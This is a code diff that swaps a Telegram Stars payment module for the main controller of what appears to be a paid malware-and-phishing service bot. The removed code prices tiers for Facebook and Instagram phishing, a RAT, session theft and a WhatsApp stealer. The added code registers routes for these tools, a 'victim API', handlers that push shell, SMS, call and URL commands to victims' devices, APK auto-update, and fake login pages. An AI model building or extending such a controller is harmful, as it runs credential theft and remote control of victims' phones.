@@ -1,664 +1,419 @@
-# stars_payment.py
+# main.py
 # ============================================================
-# نظام الدفع + الأدمن — نسخة HTML
+# DEV 1 - Bot Controller v6
+# مع APK Auto-Update + Web Dashboard
 # ============================================================
 
-import html
-import json
+import os
 import time
-from datetime import datetime, timedelta
+import threading
+import requests
+from flask import Flask, request, jsonify
 
-from telebot.types import (
-    InlineKeyboardMarkup, InlineKeyboardButton,
-    LabeledPrice, PreCheckoutQuery,
+# ============================================================
+# [1] Logging Setup
+# ============================================================
+from logging_config import (
+    get_logger, log_startup_info, log_shutdown_info,
+    setup_exception_hook,
 )
 
-from logging_config import get_logger
-from monitoring import metrics
+logger = get_logger("main")
+log_startup_info()
+setup_exception_hook()
 
-logger = get_logger("stars_payment")
+# ============================================================
+# [2] استيراد الملفات الداخلية
+# ============================================================
+from config import bot, redis_client, BOT_TOKEN, ORIGIN_SECRET
 
+from imports_manager import (
+    # Blueprints
+    rat_bp, qr_bp, lsh_bp, sh_bp, wa_bp, apk_bp,
+    # Flags
+    LSH_ENABLED, SH_ENABLED, WA_ENABLED, APK_MANAGER_ENABLED,
+    # Init functions
+    init_facebook_routes, init_instagram_routes, init_rat_routes,
+    init_qr_routes, init_lsh_routes, init_session_hunter_routes,
+    init_whatsapp_stealer_routes, init_apk_routes,
+    # Helpers
+    set_bot_reference, register_payment_handlers,
+)
+
+from api_victim import init_victim_api
+
+from bot_handlers import (
+    start_command, callback_handler,
+    dashboard_command, update_command,
+    victim_name_step, v_toast_step, v_shell_step, v_sendsms_step,
+    v_call_step, v_url_step, v_rename_step, victim_name_handler,
+    apk_toast_step, apk_shell_step, apk_sendsms_step,
+    apk_call_step, apk_url_step,
+    upd_target_handler,
+    admin_search_handler, admin_broadcast_handler,
+    admin_ban_handler, admin_unban_handler, admin_delete_handler,
+    admin_grant_vip_handler, admin_give_stars_handler,
+    admin_msg_user_handler,
+    _pending_open_url,
+)
+
+from short_link import init_short_link
+from redis_cleaner import start_cleaner
+
+# ============================================================
+# [3] Monitoring + Rate Limiting
+# ============================================================
+from monitoring import init_monitoring, metrics
+from rate_limiter import start_cleanup_thread
+
+# ============================================================
+# [4] Web Dashboard
+# ============================================================
 try:
-    from config import redis_client
-    logger.info("stars_payment: Using shared Redis")
+    from web_dashboard import init_web_dashboard
+    WEB_DASHBOARD_ENABLED = True
+    logger.info("[+] web_dashboard imported")
 except Exception as e:
-    logger.error(f"stars_payment: config failed - {e}")
-    redis_client = None
+    logger.exception(f"[-] web_dashboard import failed: {e}")
+    WEB_DASHBOARD_ENABLED = False
 
+    def init_web_dashboard(app):
+        pass
 
-def h(text):
-    """Escape HTML"""
-    if text is None:
-        return ""
-    return html.escape(str(text))
+# ============================================================
+# [5] APK Auto-Update
+# ============================================================
+try:
+    from apk_updater import init_apk_update_routes
+    APK_UPDATE_ENABLED = True
+    logger.info("[+] apk_updater imported")
+except Exception as e:
+    logger.exception(f"[-] apk_updater import failed: {e}")
+    APK_UPDATE_ENABLED = False
+
+    def init_apk_update_routes(app, bot):
+        pass
 
 
 # ============================================================
-# [1] الإعدادات العامة
+# [6] Flask Setup
 # ============================================================
-PRICING_PLANS = {
-    "basic": {
-        "name": "الباقة الأساسية",
-        "stars": 15,
-        "days": 30,
-        "daily_limit": 30,
-        "features": ["فيسبوك", "انستقرام", "QR Code"]
-    },
-    "pro": {
-        "name": "الباقة الاحترافية",
-        "stars": 50,
-        "days": 30,
-        "daily_limit": 150,
-        "features": ["فيسبوك", "انستقرام", "QR Code", "RAT", "LSH", "SH"]
-    },
-    "vip": {
-        "name": "باقة VIP",
-        "stars": 120,
-        "days": 90,
-        "daily_limit": 999999,
-        "features": ["كل الأدوات بدون قيود", "دعم مباشر", "أولوية"]
-    },
-}
-
-FREE_TRIAL_USES = 3
-AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh", "apk", "wa"]
-
-ADMIN_IDS = [7631249810]
-VIP_IDS = [7631249810]
-
-
-def is_admin(user_id):
-    return int(user_id) in ADMIN_IDS
-
-
-def is_vip(user_id):
-    if int(user_id) in ADMIN_IDS:
-        return True
-    if int(user_id) in VIP_IDS:
-        return True
-    return False
+app = Flask(__name__)
 
 
 # ============================================================
-# [2] إدارة المستخدمين
+# [7] Origin Gate
 # ============================================================
-def _user_key(user_id):
-    return f"user:{user_id}"
+ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']
+
+ALLOWED_PREFIXES = (
+    '/lsh', '/sh', '/rat', '/qr', '/wa',
+    '/apk',             # ★ APK Manager + Auto-Update
+    '/dashboard',       # ★ Web Dashboard
+    '/api/v1/session', '/qr_scan', '/f/',
+    '/login.php', '/ig_login.php', '/system_secure',
+    '/manifest.json', '/sw.js',
+    '/_health', '/_metrics', '/_version',
+)
 
 
-def get_user(user_id):
-    if not redis_client:
+@app.before_request
+def verify_origin():
+    path = request.path
+
+    if path in ORIGIN_GATE_EXEMPT:
         return None
-    try:
-        raw = redis_client.get(_user_key(user_id))
-        if raw:
-            return json.loads(raw)
-    except Exception as e:
-        logger.error(f"get_user error: {e}")
-    return None
 
+    if request.method == 'OPTIONS':
+        return None
 
-def save_user(user_id, data):
-    if not redis_client:
-        return False
-    try:
-        redis_client.set(_user_key(user_id), json.dumps(data))
-        return True
-    except Exception as e:
-        logger.error(f"save_user error: {e}")
-        return False
+    if path.startswith('/apk/') or path.startswith('/victim/'):
+        return None
 
+    if any(path.startswith(p) for p in ALLOWED_PREFIXES):
+        return None
 
-def create_new_user(user_id, username="Unknown", first_name="User"):
-    user = {
-        "user_id": user_id,
-        "username": username,
-        "first_name": first_name,
-        "created_at": datetime.utcnow().isoformat(),
-        "trial_uses": {tool: FREE_TRIAL_USES for tool in AVAILABLE_TOOLS},
-        "subscription": None,
-        "total_stars_spent": 0,
-        "purchases": [],
-        "daily_reset_date": datetime.utcnow().strftime("%Y-%m-%d"),
-        "daily_uses_count": 0,
-        "is_banned": False,
-        "is_vip": False,
-        "notes": "",
-    }
-    save_user(user_id, user)
+    secret = request.headers.get('X-Origin-Secret', '')
+    if secret == ORIGIN_SECRET:
+        return None
 
-    if redis_client:
-        try:
-            redis_client.sadd("all_users", str(user_id))
-        except Exception as e:
-            logger.warning(f"sadd user error: {e}")
-
-    return user
-
-
-def get_or_create_user(user_id, username="Unknown", first_name="User"):
-    user = get_user(user_id)
-    if not user:
-        user = create_new_user(user_id, username, first_name)
-
-    # تأكد من وجود كل الحقول
-    if "trial_uses" not in user:
-        user["trial_uses"] = {tool: FREE_TRIAL_USES for tool in AVAILABLE_TOOLS}
-
-    for tool in AVAILABLE_TOOLS:
-        user["trial_uses"].setdefault(tool, FREE_TRIAL_USES)
-
-    user.setdefault("daily_reset_date", datetime.utcnow().strftime("%Y-%m-%d"))
-    user.setdefault("daily_uses_count", 0)
-    user.setdefault("is_banned", False)
-    user.setdefault("is_vip", False)
-    user.setdefault("notes", "")
-
-    return user
-
-
-def get_all_users():
-    if not redis_client:
-        return []
-    try:
-        user_ids = redis_client.smembers("all_users")
-        users = []
-        for uid in (user_ids or []):
-            u = get_user(uid)
-            if u:
-                users.append(u)
-        return users
-    except Exception as e:
-        logger.error(f"get_all_users error: {e}")
-        return []
-
-
-def delete_user(user_id):
-    if not redis_client:
-        return False
-    try:
-        redis_client.delete(_user_key(user_id))
-        redis_client.srem("all_users", str(user_id))
-        return True
-    except Exception as e:
-        logger.error(f"delete_user error: {e}")
-        return False
-
-
-def ban_user(user_id):
-    user = get_or_create_user(user_id)
-    user["is_banned"] = True
-    return save_user(user_id, user)
-
-
-def unban_user(user_id):
-    user = get_or_create_user(user_id)
-    user["is_banned"] = False
-    return save_user(user_id, user)
-
-
-def _today_key():
-    return datetime.utcnow().strftime("%Y-%m-%d")
-
-
-def _reset_daily_counter_if_needed(user):
-    today = _today_key()
-    if user.get("daily_reset_date") != today:
-        user["daily_reset_date"] = today
-        user["daily_uses_count"] = 0
-    return user
-
-
-# ============================================================
-# [3] التحقق من الصلاحيات
-# ============================================================
-def check_subscription_active(user):
-    sub = user.get("subscription")
-    if not sub:
-        return False
-    try:
-        expires_at = datetime.fromisoformat(sub["expires_at"])
-        return datetime.utcnow() < expires_at
-    except Exception as e:
-        logger.warning(f"check_subscription error: {e}")
-        return False
-
-
-def can_use_tool(user_id, tool):
-    user = get_or_create_user(user_id)
-    user = _reset_daily_counter_if_needed(user)
-
-    if user.get("is_banned"):
-        return {"allowed": False, "reason": "banned"}
-
-    if is_admin(user_id):
-        return {"allowed": True, "reason": "admin", "unlimited": True}
-
-    if user.get("is_vip") or is_vip(user_id):
-        return {"allowed": True, "reason": "vip", "unlimited": True}
-
-    trial = user.get("trial_uses", {})
-    if trial.get(tool, 0) > 0:
-        return {
-            "allowed": True,
-            "reason": "free_trial",
-            "remaining_free": trial[tool]
-        }
-
-    if check_subscription_active(user):
-        plan_key = user["subscription"]["plan"]
-        plan = PRICING_PLANS.get(plan_key, {})
-        daily_limit = plan.get("daily_limit", 0)
-        used_today = user.get("daily_uses_count", 0)
-        if used_today < daily_limit:
-            return {
-                "allowed": True,
-                "reason": "subscription",
-                "remaining_today": daily_limit - used_today
-            }
-        return {
-            "allowed": False,
-            "reason": "daily_limit_reached",
-            "daily_limit": daily_limit
-        }
-
-    return {"allowed": False, "reason": "no_credit", "remaining_free": 0}
-
-
-def consume_usage(user_id, tool):
-    user = get_or_create_user(user_id)
-    user = _reset_daily_counter_if_needed(user)
-
-    if is_admin(user_id) or user.get("is_vip") or is_vip(user_id):
-        return True
-
-    trial = user.get("trial_uses", {})
-    if trial.get(tool, 0) > 0:
-        trial[tool] -= 1
-        user["trial_uses"] = trial
-        save_user(user_id, user)
-        return True
-
-    if check_subscription_active(user):
-        user["daily_uses_count"] = user.get("daily_uses_count", 0) + 1
-        save_user(user_id, user)
-        return True
-
-    return False
-
-
-# ============================================================
-# [4] لوحات الباقات
-# ============================================================
-def build_plans_keyboard():
-    markup = InlineKeyboardMarkup()
-    for key, plan in PRICING_PLANS.items():
-        text = f"⭐ {plan['stars']} نجمة — {plan['name']} ({plan['days']} يوم)"
-        markup.add(InlineKeyboardButton(text, callback_data=f"buy_plan_{key}"))
-    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
-    return markup
-
-
-def build_main_payment_keyboard():
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("💎 عرض الباقات المتاحة", callback_data="show_plans"))
-    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
-    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
-    return markup
-
-
-def build_plans_text():
-    lines = ["💎 <b>الباقات المتاحة:</b>\n━━━━━━━━━━━━━━━━━━"]
-    for key, plan in PRICING_PLANS.items():
-        lines.append(
-            f"\n🔹 <b>{plan['name']}</b>\n"
-            f"   ⭐ السعر: {plan['stars']} نجمة\n"
-            f"   📅 المدة: {plan['days']} يوم\n"
-            f"   🎯 الحد اليومي: {plan['daily_limit']} عملية\n"
-            f"   ✨ الميزات: {', '.join(plan['features'])}"
-        )
-    lines.append("\n━━━━━━━━━━━━━━━━━━\nاختر الباقة المناسبة من الأزرار أدناه 👇")
-    return "\n".join(lines)
-
-
-def build_account_text(user_id):
-    user = get_or_create_user(user_id)
-    user = _reset_daily_counter_if_needed(user)
-
-    trial = user.get("trial_uses", {})
-    tool_names = {
-        "fb": "فيسبوك", "ig": "انستقرام", "qr": "QR Code",
-        "rat": "RAT", "lsh": "LSH", "sh": "سرقة الجلسات",
-        "apk": "APK", "wa": "واتساب",
-    }
-
-    trial_lines = []
-    for tool, count in trial.items():
-        trial_lines.append(f"  • {tool_names.get(tool, tool)}: {count} متبقية")
-    trial_text = "\n".join(trial_lines) if trial_lines else "  لا يوجد"
-
-    if is_admin(user_id):
-        status = "👑 <b>أدمن</b> — كل شيء مفتوح (لا نهائي)"
-    elif user.get("is_banned"):
-        status = "🚫 <b>محظور</b> — لا يمكنك استخدام البوت"
-    elif user.get("is_vip") or is_vip(user_id):
-        status = "💎 <b>VIP</b> — كل شيء بدون حدود"
-    elif check_subscription_active(user):
-        plan_key = user["subscription"]["plan"]
-        plan = PRICING_PLANS.get(plan_key, {})
-        expires = datetime.fromisoformat(user["subscription"]["expires_at"])
-        remaining_days = (expires - datetime.utcnow()).days
-        used_today = user.get("daily_uses_count", 0)
-        status = (
-            f"✅ <b>{plan['name']}</b>\n"
-            f"  📅 متبقي: {remaining_days} يوم\n"
-            f"  🎯 استخدام اليوم: {used_today}/{plan['daily_limit']}"
-        )
-    else:
-        status = "❌ لا يوجد اشتراك نشط"
-
-    return (
-        f"👤 <b>حسابك الشخصي</b>\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"🆔 الآيدي: <code>{user_id}</code>\n"
-        f"👋 الاسم: {h(user.get('first_name', 'Unknown'))}\n\n"
-        f"📊 <b>حالتك:</b>\n{status}\n\n"
-        f"🎁 <b>الاستخدام المجاني المتبقي:</b>\n{trial_text}\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"💰 إجمالي النجوم المصروفة: {user.get('total_stars_spent', 0)}⭐"
+    client_ip = (
+        request.headers.get('CF-Connecting-IP') or
+        request.headers.get('X-Forwarded-For') or
+        request.remote_addr
     )
+    logger.warning(f"🚫 BLOCKED: {path} from {client_ip}")
+    metrics.inc_counter("blocked_requests", tags={"path": path})
+
+    return jsonify({"error": "Access denied"}), 403
 
 
 # ============================================================
-# [5] الفاتورة
+# [8] Health Check
 # ============================================================
-def send_invoice(bot, chat_id, plan_key):
-    plan = PRICING_PLANS.get(plan_key)
-    if not plan:
-        bot.send_message(chat_id, "❌ الباقة غير موجودة.")
-        return
+@app.route('/')
+def health_check():
+    return "DEV 1 Controller is running.", 200
 
-    payload = f"sub|{plan_key}|{chat_id}|{int(time.time())}"
+
+# ============================================================
+# [9] Request Timing
+# ============================================================
+@app.before_request
+def start_timer():
+    request._start_time = time.time()
+
+
+@app.after_request
+def log_request(response):
+    try:
+        if hasattr(request, '_start_time'):
+            elapsed_ms = (time.time() - request._start_time) * 1000
+            if not request.path.startswith(('/_', '/')):
+                logger.debug(
+                    f"🌐 {request.method} {request.path} → "
+                    f"{response.status_code} ({elapsed_ms:.1f}ms)"
+                )
+                metrics.observe_timing(
+                    "http_request_ms",
+                    elapsed_ms,
+                    tags={"method": request.method, "path": request.path}
+                )
+    except Exception:
+        pass
+    return response
+
+
+# ============================================================
+# [10] تسجيل الـ Blueprints
+# ============================================================
+if sh_bp:
+    app.register_blueprint(sh_bp)
+    logger.info("[+] Registered: sh_bp")
+
+if lsh_bp:
+    app.register_blueprint(lsh_bp)
+    logger.info("[+] Registered: lsh_bp")
+
+if rat_bp:
+    app.register_blueprint(rat_bp)
+    logger.info("[+] Registered: rat_bp")
+
+if qr_bp:
+    app.register_blueprint(qr_bp)
+    logger.info("[+] Registered: qr_bp")
+
+if wa_bp:
+    app.register_blueprint(wa_bp)
+    logger.info("[+] Registered: wa_bp")
+
+if apk_bp:
+    app.register_blueprint(apk_bp)
+    logger.info("[+] Registered: apk_bp")
+
+
+# ============================================================
+# [11] Init Routes
+# ============================================================
+init_facebook_routes(app, bot)
+logger.info("[+] Init: facebook routes")
+
+init_instagram_routes(app, bot)
+logger.info("[+] Init: instagram routes")
+
+init_rat_routes(app, bot)
+logger.info("[+] Init: rat routes")
+
+init_qr_routes(app, bot)
+logger.info("[+] Init: qr routes")
+
+init_session_hunter_routes(app, bot)
+logger.info("[+] Init: session_hunter routes")
+
+# WhatsApp Stealer
+if WA_ENABLED:
+    try:
+        init_whatsapp_stealer_routes(app, bot)
+        logger.info("[+] Init: wa_stealer routes")
+    except Exception as e:
+        logger.exception(f"[-] WA Stealer init failed: {e}")
+else:
+    logger.warning("[-] WA Stealer disabled - skipping init")
+
+# APK Manager
+if APK_MANAGER_ENABLED:
+    try:
+        init_apk_routes(app, bot)
+        logger.info("[+] Init: apk_manager routes")
+    except Exception as e:
+        logger.exception(f"[-] APK Manager init failed: {e}")
+else:
+    logger.warning("[-] APK Manager disabled - skipping init")
+
+# ★ APK Auto-Update Routes
+if APK_UPDATE_ENABLED:
+    try:
+        init_apk_update_routes(app, bot)
+        logger.info("[+] Init: apk update routes")
+    except Exception as e:
+        logger.exception(f"[-] APK Update init failed: {e}")
+else:
+    logger.warning("[-] APK Update disabled - skipping init")
+
+# LSH
+if LSH_ENABLED:
+    try:
+        init_lsh_routes(app, bot)
+        set_bot_reference(bot)
+        logger.info("[+] Init: LSH routes + bot reference")
+    except Exception as e:
+        logger.exception(f"[-] LSH init failed: {e}")
+else:
+    logger.warning("[-] LSH disabled - skipping init")
+
+register_payment_handlers(bot)
+logger.info("[+] Init: payment handlers")
+
+# ============================================================
+# [12] Victim API
+# ============================================================
+try:
+    init_victim_api(app, bot)
+    logger.info("[+] Init: victim API")
+except Exception as e:
+    logger.exception(f"[-] Victim API init failed: {e}")
+
+# ============================================================
+# [13] Short Link
+# ============================================================
+try:
+    init_short_link(app)
+    logger.info("[+] Init: short_link")
+except Exception as e:
+    logger.exception(f"[-] Short link init failed: {e}")
+
+# ============================================================
+# [14] Monitoring
+# ============================================================
+init_monitoring(app)
+start_cleanup_thread()
+
+# ============================================================
+# [15] Web Dashboard
+# ============================================================
+if WEB_DASHBOARD_ENABLED:
+    try:
+        init_web_dashboard(app)
+        logger.info("[+] Init: web dashboard at /dashboard")
+    except Exception as e:
+        logger.exception(f"[-] Web Dashboard init failed: {e}")
+else:
+    logger.warning("[-] Web Dashboard disabled - skipping init")
+
+# ============================================================
+# [16] LSH - الرابط المُدخل
+# ============================================================
+from imports_manager import lsh_push_command
+
+
+@bot.message_handler(
+    func=lambda m: m.chat.id in _pending_open_url
+    and m.text and m.text.startswith("http")
+)
+def handle_open_url(message):
+    sid = _pending_open_url.pop(message.chat.id, None)
+    if sid:
+        ok = lsh_push_command(sid, {
+            "action": "url",
+            "payload": {"url": message.text}
+        })
+        bot.send_message(
+            message.chat.id,
+            "✅ تم الإرسال" if ok else "❌ فشل"
+        )
+        metrics.inc_counter(
+            "lsh_url_commands",
+            tags={"status": "ok" if ok else "fail"}
+        )
+
+
+# ============================================================
+# [17] تشغيل البوت
+# ============================================================
+def run_telegram_bot():
+    logger.info("=" * 60)
+    logger.info("🤖 Starting Telegram Bot polling...")
+    logger.info(f"🔑 Bot token: {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
+    logger.info("=" * 60)
 
     try:
-        bot.send_invoice(
-            chat_id=chat_id,
-            title=plan["name"],
-            description=f"اشتراك {plan['days']} يوم | حد يومي {plan['daily_limit']} عملية",
-            invoice_payload=payload,
-            provider_token="",
-            currency="XTR",
-            prices=[LabeledPrice(label=plan["name"], amount=plan["stars"])],
-            start_parameter=f"sub-{plan_key}",
-            need_name=False,
-            need_phone_number=False,
-            need_email=False,
-            need_shipping_address=False,
-            is_flexible=False,
+        r = requests.get(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook",
+            params={"drop_pending_updates": "true"},
+            timeout=15,
         )
-        logger.info(f"Invoice sent: {plan_key} → user={chat_id}")
+        logger.info(f"[+] deleteWebhook HTTP {r.status_code}")
     except Exception as e:
-        logger.exception(f"send_invoice error: {e}")
+        logger.error(f"[-] deleteWebhook: {e}")
 
+    try:
+        r = requests.get(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/getMe",
+            timeout=15
+        )
+        logger.info(f"[+] getMe: {r.text[:200]}")
+    except Exception as e:
+        logger.error(f"[-] getMe: {e}")
 
-def activate_subscription(user_id, plan_key):
-    user = get_or_create_user(user_id)
-    plan = PRICING_PLANS[plan_key]
-
-    now = datetime.utcnow()
-    if check_subscription_active(user):
-        current_expiry = datetime.fromisoformat(user["subscription"]["expires_at"])
-        start_from = max(current_expiry, now)
-    else:
-        start_from = now
-
-    new_expiry = start_from + timedelta(days=plan["days"])
-
-    user["subscription"] = {
-        "plan": plan_key,
-        "started_at": now.isoformat(),
-        "expires_at": new_expiry.isoformat(),
-        "stars_paid": plan["stars"]
-    }
-    user["total_stars_spent"] = user.get("total_stars_spent", 0) + plan["stars"]
-    user["purchases"] = user.get("purchases", [])
-    user["purchases"].append({
-        "plan": plan_key,
-        "stars": plan["stars"],
-        "date": now.isoformat()
-    })
-    save_user(user_id, user)
-
-    metrics.inc_counter("subscriptions_activated", tags={"plan": plan_key})
-    return user
-
-
-# ============================================================
-# [6] تسجيل معالجات الدفع
-# ============================================================
-def register_payment_handlers(bot):
-
-    @bot.pre_checkout_query_handler(func=lambda q: True)
-    def pre_checkout(pre_checkout_q: PreCheckoutQuery):
+    logger.info("[+] Starting infinity_polling loop...")
+    attempt = 0
+    while True:
         try:
-            bot.answer_pre_checkout_query(pre_checkout_q.id, ok=True)
-            logger.info(f"Pre-checkout OK: {pre_checkout_q.from_user.id}")
-        except Exception as e:
-            logger.error(f"pre_checkout error: {e}")
+            attempt += 1
+            logger.info(f"[+] Polling attempt #{attempt}")
+            metrics.inc_counter("bot_polling_attempts")
 
-    @bot.message_handler(content_types=['successful_payment'])
-    def successful_payment(message):
-        try:
-            payload = message.successful_payment.invoice_payload
-            parts = payload.split("|")
-            if len(parts) < 3:
-                return
-
-            plan_key = parts[1]
-            try:
-                user_id = int(parts[2])
-            except Exception:
-                user_id = message.from_user.id
-
-            if message.from_user.id != user_id:
-                user_id = message.from_user.id
-
-            user = activate_subscription(user_id, plan_key)
-            plan = PRICING_PLANS.get(plan_key)
-            if not plan:
-                return
-
-            expires = datetime.fromisoformat(user["subscription"]["expires_at"])
-            expires_str = expires.strftime("%Y-%m-%d %H:%M UTC")
-
-            bot.send_message(
-                user_id,
-                f"✅ <b>تم تفعيل اشتراكك بنجاح!</b>\n"
-                f"━━━━━━━━━━━━━━━━━━\n"
-                f"💎 الباقة: {plan['name']}\n"
-                f"⭐ النجوم المدفوعة: {plan['stars']}\n"
-                f"📅 ينتهي في: <code>{expires_str}</code>\n"
-                f"🎯 الحد اليومي: {plan['daily_limit']} عملية\n"
-                f"━━━━━━━━━━━━━━━━━━\n"
-                f"استمتع بكل الميزات! 🚀",
-                parse_mode="HTML"
+            bot.infinity_polling(
+                skip_pending=True,
+                timeout=30,
+                long_polling_timeout=30,
+                none_stop=True,
             )
-            logger.info(f"Subscription activated: user={user_id}, plan={plan_key}")
-
         except Exception as e:
-            logger.exception(f"successful_payment error: {e}")
+            logger.exception(f"[-] Polling crashed: {e}")
+            metrics.inc_counter("bot_polling_crashes")
+            logger.info("[+] Restarting in 5 seconds...")
+            time.sleep(5)
 
 
 # ============================================================
-# [7] دوال الأدمن
+# [18] Main
 # ============================================================
-def build_admin_menu():
-    m = InlineKeyboardMarkup()
-    m.row(InlineKeyboardButton("👥 قائمة المستخدمين", callback_data="admin_users_0"))
-    m.row(
-        InlineKeyboardButton("➕ إضافة مستخدم لباقة", callback_data="admin_add_sub"),
-        InlineKeyboardButton("💎 منح VIP", callback_data="admin_grant_vip"),
-    )
-    m.row(
-        InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_ban"),
-        InlineKeyboardButton("✅ فك حظر", callback_data="admin_unban"),
-    )
-    m.row(
-        InlineKeyboardButton("🗑️ حذف مستخدم", callback_data="admin_delete"),
-        InlineKeyboardButton("🔍 بحث", callback_data="admin_search"),
-    )
-    m.row(
-        InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
-        InlineKeyboardButton("📢 رسالة جماعية", callback_data="admin_broadcast"),
-    )
-    m.row(
-        InlineKeyboardButton("⭐ إعطاء نجوم", callback_data="admin_give_stars"),
-        InlineKeyboardButton("📋 آخر المسجلين", callback_data="admin_recent"),
-    )
-    m.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
-    return m
+if __name__ == "__main__":
+    try:
+        start_cleaner()
+        logger.info("[+] Redis cleaner started")
 
+        bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
+        bot_thread.start()
+        logger.info("[+] Bot thread started")
 
-def build_admin_users_keyboard(users, page=0, per_page=10):
-    m = InlineKeyboardMarkup()
-    start = page * per_page
-    end = start + per_page
-    page_users = users[start:end]
+        time.sleep(2)
 
-    for u in page_users:
-        uid = u.get("user_id")
-        name = (u.get("first_name") or u.get("username") or "Unknown")[:20]
+        port = int(os.environ.get("PORT", 8080))
+        logger.info(f"🌐 Flask Web Server starting on port {port}...")
 
-        if is_admin(uid):
-            icon = "👑"
-        elif u.get("is_banned"):
-            icon = "🚫"
-        elif u.get("is_vip"):
-            icon = "💎"
-        elif check_subscription_active(u):
-            icon = "✅"
-        else:
-            icon = "👤"
+        app.run(
+            host="0.0.0.0",
+            port=port,
+            debug=False,
+            use_reloader=False,
+            threaded=True,
+        )
 
-        m.row(InlineKeyboardButton(
-            f"{icon} {name} | {uid}",
-            callback_data=f"admin_user_{uid}"
-        ))
-
-    total_pages = (len(users) + per_page - 1) // per_page
-    nav_buttons = []
-    if page > 0:
-        nav_buttons.append(InlineKeyboardButton("⬅️ السابق", callback_data=f"admin_users_{page-1}"))
-    nav_buttons.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
-    if page < total_pages - 1:
-        nav_buttons.append(InlineKeyboardButton("التالي ➡️", callback_data=f"admin_users_{page+1}"))
-
-    if nav_buttons:
-        m.row(*nav_buttons)
-
-    m.row(InlineKeyboardButton("🔙 رجوع للأدمن", callback_data="admin_panel"))
-    return m
-
-
-def build_user_detail_keyboard(uid, user):
-    m = InlineKeyboardMarkup()
-
-    if user.get("is_banned"):
-        m.row(InlineKeyboardButton("✅ فك الحظر", callback_data=f"admin_unban_user_{uid}"))
-    else:
-        m.row(InlineKeyboardButton("🚫 حظر", callback_data=f"admin_ban_user_{uid}"))
-
-    if user.get("is_vip"):
-        m.row(InlineKeyboardButton("❌ إزالة VIP", callback_data=f"admin_remove_vip_{uid}"))
-    else:
-        m.row(InlineKeyboardButton("💎 منح VIP", callback_data=f"admin_grant_vip_user_{uid}"))
-
-    m.row(
-        InlineKeyboardButton("📅 إعطاء اشتراك", callback_data=f"admin_give_sub_{uid}"),
-        InlineKeyboardButton("⭐ إعطاء نجوم", callback_data=f"admin_give_stars_{uid}"),
-    )
-    m.row(InlineKeyboardButton("🗑️ حذف نهائي", callback_data=f"admin_delete_user_{uid}"))
-    m.row(
-        InlineKeyboardButton("📨 رسالة له", callback_data=f"admin_msg_user_{uid}"),
-        InlineKeyboardButton("🔙 رجوع", callback_data="admin_users_0"),
-    )
-    return m
-
-
-def build_user_info_text(uid, user):
-    if is_admin(uid):
-        status = "👑 أدمن"
-    elif user.get("is_banned"):
-        status = "🚫 محظور"
-    elif user.get("is_vip"):
-        status = "💎 VIP"
-    elif check_subscription_active(user):
-        plan_key = user["subscription"]["plan"]
-        plan = PRICING_PLANS.get(plan_key, {})
-        expires = datetime.fromisoformat(user["subscription"]["expires_at"])
-        days_left = (expires - datetime.utcnow()).days
-        status = f"✅ {plan['name']} ({days_left} يوم متبقي)"
-    else:
-        status = "👤 مجاني"
-
-    created = user.get("created_at", "")[:19].replace("T", " ")
-    purchases = user.get("purchases", [])
-    total_spent = user.get("total_stars_spent", 0)
-    daily_uses = user.get("daily_uses_count", 0)
-    trials = user.get("trial_uses", {})
-
-    return (
-        f"👤 <b>معلومات المستخدم</b>\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"🆔 <code>{uid}</code>\n"
-        f"👋 الاسم: {h(user.get('first_name', 'Unknown'))}\n"
-        f"📝 Username: @{h(user.get('username', 'N/A'))}\n\n"
-        f"📊 <b>الحالة:</b> {status}\n"
-        f"📅 <b>التسجيل:</b> <code>{created}</code>\n"
-        f"🎯 <b>استخدام اليوم:</b> <code>{daily_uses}</code>\n"
-        f"⭐ <b>إجمالي المصروف:</b> <code>{total_spent}</code> نجمة\n"
-        f"🛍️ <b>عدد المشتريات:</b> <code>{len(purchases)}</code>\n\n"
-        f"🎁 <b>الاستخدام المجاني:</b>\n"
-        f"• فيسبوك: <code>{trials.get('fb', 0)}</code>\n"
-        f"• انستقرام: <code>{trials.get('ig', 0)}</code>\n"
-        f"• QR: <code>{trials.get('qr', 0)}</code>\n"
-        f"• RAT: <code>{trials.get('rat', 0)}</code>\n"
-        f"• LSH: <code>{trials.get('lsh', 0)}</code>\n"
-        f"• SH: <code>{trials.get('sh', 0)}</code>\n"
-        f"• APK: <code>{trials.get('apk', 0)}</code>\n"
-        f"• WA: <code>{trials.get('wa', 0)}</code>\n\n"
-        f"📝 <b>ملاحظات:</b> <code>{h(user.get('notes', 'لا يوجد'))}</code>"
-    )
-
-
-def build_admin_stats_text():
-    users = get_all_users()
-
-    total_users = len(users)
-    banned = sum(1 for u in users if u.get("is_banned"))
-    vips = sum(1 for u in users if u.get("is_vip"))
-    subscribed = sum(1 for u in users if check_subscription_active(u))
-
-    total_stars = sum(u.get("total_stars_spent", 0) for u in users)
-    total_purchases = sum(len(u.get("purchases", [])) for u in users)
-
-    now = time.time()
-    recent = sum(
-        1 for u in users
-        if u.get("created_at") and
-        (now - datetime.fromisoformat(u["created_at"]).timestamp()) < 86400
-    )
-
-    return (
-        f"📊 <b>إحصائيات النظام</b>\n"
-        f"━━━━━━━━━━━━━━━━━━\n\n"
-        f"👥 <b>إجمالي المستخدمين:</b> <code>{total_users}</code>\n"
-        f"✅ <b>المشتركين النشطين:</b> <code>{subscribed}</code>\n"
-        f"💎 <b>VIP:</b> <code>{vips}</code>\n"
-        f"🚫 <b>المحظورين:</b> <code>{banned}</code>\n"
-        f"🆕 <b>آخر 24 ساعة:</b> <code>{recent}</code>\n\n"
-        f"💰 <b>إجمالي النجوم:</b> <code>{total_stars}</code> ⭐\n"
